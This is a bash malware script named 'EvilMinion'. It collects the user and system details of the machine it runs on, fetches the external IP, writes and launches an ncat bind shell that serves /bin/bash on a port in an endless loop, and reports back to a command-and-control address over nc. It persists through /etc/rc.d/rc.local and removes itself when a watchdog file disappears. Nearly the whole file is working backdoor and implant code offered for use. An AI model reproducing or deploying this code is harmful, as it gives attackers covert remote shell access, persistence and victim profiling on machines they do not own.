#!/bin/bash -x
#
# Regards, the Alveare Solutions society,
#
# EVIL MINION

declare -A CONSCRIPT_COMMANDS

SCRIPT_NAME='EvilMinion'
VERSION='Explorer'
VERSION_NO='1.0'
VERSION_TARGET_OS='Linux'
VERSION_TARGET_ARCH='x32,x64'

# HOT_PARAMETERS

ANCHOR_PATH="./.ema-cache"
RAW_BACKDOOR_PATH='./.em-rsbd-cache'
RAW_BACKDOOR_LOG_PATH="./.em-rbdl-cache"
RAW_BACKDOOR_ADDRESS='127.0.0.1'
RAW_BACKDOOR_PORT=8081
MASTER_MIND_ADDRESS='127.0.0.1'
MASTER_MIND_PORT=8080
CONSCRIPT_INTERPRETER_PATH='/bin/bash'
CNX_TIMEOUT=5
ANCHOR_WATCHDOG_SLEEP=3
ATTEMPT_LIMIT=5
PASSWORD='secret'

# COLD PARAMETERS

SCRIPT_PATH="$0"
RC_LOCAL_PATH='/etc/rc.d/rc.local'
CNX_PROTOCOL='raw'
RAW_BACKDOOR_PID=
ANCHOR_WATCHDOG_PID=
PHOME_HOME_SIG=
SCANNER_CACHE=
CONSCRIPT_ADDR=
CONSCRIPT_COMMANDS=(
['scan-machine']=' echo -n "`whoami` "; echo "`uname -a` "'
['create-anchor']=" touch $ANCHOR_PATH"
['create-rc-local']=" touch $RC_LOCAL_PATH"
['set-boot-init']=" echo $SCRIPT_PATH >> $RC_LOCAL_PATH"
['external-ip']=" curl whatismyip.akamai.com 2> /dev/null"
)

# SETTERS

function set_conscript_address () {
    CONSCRIPT_ADDR=`fetch_external_ipv4_address`
    RAW_BACKDOOR_ADDRESS="$CONSCRIPT_ADDR"
    return $?
}

# SCANNERS

function scan_victim_machine () {
    SCANNER_CACHE=`${CONSCRIPT_COMMANDS['scan-machine']}`
    return $?
}

# CREATORS

function create_anchor_file () {
    ${CONSCRIPT_COMMANDS['create-anchor']} &> /dev/null
    return $?
}

# ATTEMPTS

function attempt_phone_home () {
    for attempt_count in `seq $ATTEMPT_LIMIT`; do
        if [ $attempt_count -eq $ATTEMPT_LIMIT ]; then
            return 1
        fi
        issue_phone_home_signal "$PHOME_HOME_SIG"
        if [ $? -eq 0 ]; then
            break
        fi
    done
    return 0
}

function attempt_set_boot_init () {
    if [ ! -f "$RC_LOCAL_PATH" ]; then
        ${CONSCRIPT_COMMANDS['create-rc-local']} &> /dev/null
        if [ $? -ne 0 ]; then
            return 1
        fi
    fi
    for attempt_count in `seq $ATTEMPT_LIMIT`; do
        if [ $attempt_count -eq $ATTEMPT_LIMIT ]; then
            return 2
        fi
        ${CONSCRIPT_COMMANDS['set-boot-init']} &> /dev/null
        if [ $? -eq 0 ]; then
            break
        fi
    done
    return 0
}

# FORMATTERS

function format_phone_home_signal () {
    if [ -z "$SCANNER_CACHE" ]; then
        scan_victim_machine
        if [ $? -ne 0 ]; then
            return 1
        fi
    fi
    local USER=`echo "$SCANNER_CACHE" | awk '{ print $1 }'`
    local HOST=`echo "$SCANNER_CACHE" | awk '{ print $3 }'`
    local DETAILS=`echo "$SCANNER_CACHE" | awk \
        'BEGIN { OFS="," } { print $2, $4, $5, $6, $7, $8, $9, $10, $11 }'`
    PHOME_HOME_SIG="crecord-register ${CONSCRIPT_ADDR},${RAW_BACKDOOR_PORT},${CNX_PROTOCOL},${USER},${HOST},${DETAILS}"
    return 0
}

function format_open_backdoor_cargo_script_arguments () {
    local ARGUMENTS=(
        "--running-mode=endless"
        "--port=${RAW_BACKDOOR_PORT}"
        "--log-file=${RAW_BACKDOOR_LOG_PATH}"
        "--shell=${CONSCRIPT_INTERPRETER_PATH}"
    )
    echo ${ARGUMENTS[@]}
    return $?
}

# GENERAL

function self_destruct () {
    rm -rf "$SCRIPT_PATH" &> /dev/null
    return $?
}

function issue_phone_home_signal () {
    if [ -z "$PHOME_HOME_SIG" ]; then
        return 1
    fi
    echo "$PHOME_HOME_SIG" | nc -w $CNX_TIMEOUT "$MASTER_MIND_ADDRESS" $MASTER_MIND_PORT &> /dev/null
    return $?
}

function fetch_external_ipv4_address () {
    curl whatismyip.akamai.com 2> /dev/null
    return $?
}

function remove_raw_backdoor_script () {
    if [ ! -f "$RAW_BACKDOOR_PATH" ]; then
        return 1
    fi
    rm -rf "$RAW_BACKDOOR_LOG_PATH" &> /dev/null
    rm -rf "$RAW_BACKDOOR_PATH" &> /dev/null
    return $?
}

function stop_raw_backdoor () {
    kill -9 $RAW_BACKDOOR_PID &> /dev/null
    return $?
}

function commit_suicide () {
    local EXIT_CODE=
    stop_raw_backdoor
    local EXIT_CODE=$((EXIT_CODE + $?))
    remove_raw_backdoor_script
    local EXIT_CODE=$((EXIT_CODE + $?))
    self_destruct
    local EXIT_CODE=$((EXIT_CODE + $?))
    return $EXIT_CODE
}

function start_anchor_watchdog () {
    while :
    do
        if [ ! -f "$ANCHOR_PATH" ]; then
            commit_suicide
            exit $?
        fi
        sleep $ANCHOR_WATCHDOG_SLEEP
    done
}

function open_backdoor () {
    generate_raw_backdoor_script_file
    local EXIT_CODE=$?
    if [ $EXIT_CODE -ne 0 ]; then
        return $EXIT_CODE
    fi
    local ARGUMENTS=( `format_open_backdoor_cargo_script_arguments` )1
    ${RAW_BACKDOOR_PATH} ${ARGUMENTS[@]} &
    RAW_BACKDOOR_PID=$!
    bg
    if [ -z "$RAW_BACKDOOR_PID" ]; then
        return 1
    fi
    return 0
}

# GENERATORS

function generate_raw_backdoor_script_file () {
    local FILE_CONTENT="`fetch_raw_backdoor_script_content`"
    echo "$FILE_CONTENT" > "$RAW_BACKDOOR_PATH"
    chmod +x "$RAW_BACKDOOR_PATH" &> /dev/null
    return $?
}

# INIT

function init_evil_minion () {
    local EXIT_CODE=0
    create_anchor_file
    local EXIT_CODE=$((EXIT_CODE + $?))
    set_conscript_address
    local EXIT_CODE=$((EXIT_CODE + $?))
    open_backdoor
    local EXIT_CODE=$((EXIT_CODE + $?))
    scan_victim_machine
    local EXIT_CODE=$((EXIT_CODE + $?))
    format_phone_home_signal
    local EXIT_CODE=$((EXIT_CODE + $?))
    attempt_phone_home
    local EXIT_CODE=$((EXIT_CODE + $?))
    attempt_set_boot_init
    local EXIT_CODE=$((EXIT_CODE + $?))
    start_anchor_watchdog
    local EXIT_CODE=$((EXIT_CODE + $?))
    return $EXIT_CODE
}

# FETCHERS

function fetch_external_ipv4_address () {
    ${CONSCRIPTS_COMMANDS['external-ip']}
    return $?
}

function fetch_raw_backdoor_script_content () {
    cat<<EOF
#!/bin/bash

RUNNING_MODE='endless'
CONNECTION_LIMIT=3
FOREGROUND_FLAG=0
PORT_NUMBER=8080
VERBOSITY=0
SHELL_PATH='/bin/bash'

function set_shell_path () {
    local PATH="\$1"
    if [ ! -f "\$PATH" ]; then
        local PATH='/bin/bash'
    fi
    SHELL_PATH="\$PATH"
    return 0
}

function set_foreground_flag () {
    local FLAG=\$1
    if [ ! \$FLAG -eq 0 ] && [ ! \$FLAG -eq 1 ]; then
        local FLAG=0
    fi
    FOREGROUND_FLAG=\$FLAG
    return 0
}

function increment_verbosity_level () {
    local INCREMENT_BY=\$1
    check_is_integer \$INCREMENT_BY
    if [ \$? -ne 0 ]; then
        return 1
    fi
    NEW_LEVEL=\`echo "\$INCREMENT_BY + \$VERBOSITY" | bc\`
    if [ \$NEW_LEVEL -gt 3 ] || [ \$NEW_LEVEL -lt 0 ]; then
        return 2
    fi
    VERBOSITY=\$NEW_LEVEL
    return 0
}

function set_running_mode () {
    local MODE="\$1"
    if [[ "\$MODE" != 'single' ]] \\
            && [[ "\$MODE" != 'limited' ]] \\
            && [[ "\$MODE" != 'endless' ]]; then
        local MODE='single'
    fi
    RUNNING_MODE="\$MODE"
    return 0
}

function set_connection_limit () {
    local CNX_LIMIT=\$1
    check_is_integer \$CNX_LIMIT
    if [ \$? -ne 0 ]; then
        return 1
    elif [ \$CNX_LIMIT -eq 0 ]; then
        local CNX_LIMIT=3
    fi
    CONNECTION_LIMIT=\$CNX_LIMIT
    return 0
}

function set_port_number () {
    local PORT=\$1
    check_is_integer \$PORT
    if [ \$? -ne 0 ]; then
        return 1
    fi
    PORT_NUMBER=\$PORT
    return 0
}

function set_log_file_path () {
    local FILE_PATH="\$1"
    if [ ! -f "\$FILE_PATH" ]; then
        touch \$FILE_PATH &> /dev/null
        if [ \$? -ne 0 ]; then
            local FILE_PATH=""
        fi
    fi
    LOG_FILE="\$FILE_PATH"
    return 0
}

function check_is_integer () {
    local VALUE=\$1
    test \$VALUE -eq \$VALUE &> /dev/null
    return \$?
}

function raw_backdoor () {
    local PORT="\$1"
    local SHELL="\$2"
    local VERBOSITY_LVL=\$3
    if [ -f "\$LOG_FILE" ]; then
        OUTPUT="\$LOG_FILE"
    else
        OUTPUT="/dev/null"
    fi
    case \$VERBOSITY_LVL in
        0)
            ncat -l -p \$PORT -e "\$SHELL" &> /dev/null
            ;;
        1)
            ncat -v -l -p \$PORT -e "\$SHELL" 2>&1 | tee -a "\$OUTPUT"
            ;;
        2)
            ncat -vv -l -p \$PORT -e "\$SHELL" 2>&1 | tee -a "\$OUTPUT"
            ;;
        3)
            ncat -vvv -l -p \$PORT -e "\$SHELL" 2>&1 | tee -a "\$OUTPUT"
            ;;
    esac
    return $?
}

function raw_backdoor_single_mode () {
    raw_backdoor \$PORT_NUMBER "\$SHELL_PATH" \$VERBOSITY
    return $?
}

function raw_backdoor_limited_mode () {
    for item in \`seq \$CONNECTION_LIMIT\`; do
        raw_backdoor \$PORT_NUMBER "\$SHELL_PATH" \$VERBOSITY
    done
    return 0
}

function raw_backdoor_endless_mode () {
    COUNT=1
    while :
    do
        raw_backdoor \$PORT_NUMBER "\$SHELL_PATH" \$VERBOSITY
        if [ \$? -ne 0 ]; then
            sleep 2
            continue
        fi
        COUNT=\$((COUNT + 1))
    done
    return 0
}

function init_raw_backdoor_single_mode () {
    case \$FOREGROUND_FLAG in
        0)
            raw_backdoor_single_mode &
            ;;
        1)
            raw_backdoor_single_mode
            ;;
    esac
    return $?
}

function init_raw_backdoor_limited_mode () {
    case \$FOREGROUND_FLAG in
        0)
            raw_backdoor_limited_mode &
            ;;
        1)
            raw_backdoor_limited_mode
            ;;
    esac
    return $?
}

function init_raw_backdoor_endless_mode () {
    case \$FOREGROUND_FLAG in
        0)
            raw_backdoor_endless_mode &
            ;;
        1)
            raw_backdoor_endless_mode
            ;;
    esac
    return $?
}

function init_raw_backdoor () {
    case "\$RUNNING_MODE" in
        'single')
            init_raw_backdoor_single_mode
            ;;
        'limited')
            init_raw_backdoor_limited_mode
            ;;
        'endless')
            init_raw_backdoor_endless_mode
            ;;
    esac
}

if [ \$# -eq 0 ] || [ \$# -gt 7 ] ; then
    exit 1
fi

for opt in "\$@"
do
    case "\$opt" in
        -h|--help)
            exit 0
            ;;
        -f|--foreground)
            set_foreground_flag 1
            ;;
        -v|--verbose)
            increment_verbosity_level 1
            ;;
        -vv|--vverbose)
            increment_verbosity_level 2
            ;;
        -vvv|--vvverbose)
            increment_verbosity_level 3
            ;;
        -r=*|--running-mode=*)
            set_running_mode "\${opt#*=}"
            ;;
        -c=*|--connection-limit=*)
            set_connection_limit "\${opt#*=}"
            ;;
        -p=*|--port=*)
            set_port_number "\${opt#*=}"
            ;;
        -l=*|--log-file=*)
            set_log_file_path "\${opt#*=}"
            ;;
        -s=*|--shell=*)
            set_shell_path "\${opt#*=}"
            ;;
    esac
done

init_raw_backdoor
exit \$?

EOF
}

# MISCELLANEOUS

init_evil_minion
exit $?

